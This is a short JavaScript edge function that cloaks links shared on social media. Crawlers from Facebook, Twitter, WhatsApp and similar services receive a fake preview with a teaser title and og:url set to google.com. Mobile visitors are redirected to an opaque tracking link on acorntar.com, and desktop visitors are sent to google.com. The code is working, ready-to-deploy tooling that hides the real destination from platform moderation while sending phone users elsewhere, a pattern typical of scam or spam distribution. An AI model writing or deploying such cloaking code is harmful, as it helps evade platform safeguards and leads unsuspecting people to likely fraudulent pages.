export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);
  
  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://scontent.fkhi5-2.fna.fbcdn.net/v/t39.30808-6/815061137_122109547527450292_8475695239377705351_n.jpg?stp=dst-jpg_tt6&cstp=mx1600x851&ctp=s1600x851&_nc_cat=108&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=a5f93a&_nc_eui2=AeEKZyC4Z7Uz_aGF2V5ziZnxS_lV-0kVDR9L-VX7SRUNH6ic9t4DauMTp3u0fHZiNgNQtHxu2D9HH7g2Gcv3aken&_nc_ohc=cLpU--LHsUgQ7kNvwEejHgw&_nc_oc=AdoCGrlq9SsDTw3Iv0MdleoFFD-KVo9OUv7aI8iE9_Wo-OUyGUAQuImWhPAggcTdpPaUC1OPfHr9Ph6u1LH5iHZU&_nc_zt=23&_nc_ht=scontent.fkhi5-2.fna&_nc_gid=xdI1TSB2ROD3cTf3fzmkUA&_nc_ss=7b2a8&oh=00_AQLmpOCqzZ2igj1naJTlZVXiJXvaw5BWoxrZEZXcN5LYTQ&oe=6AB4B299">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;
    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  if (isMobile) {
    return Response.redirect("https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
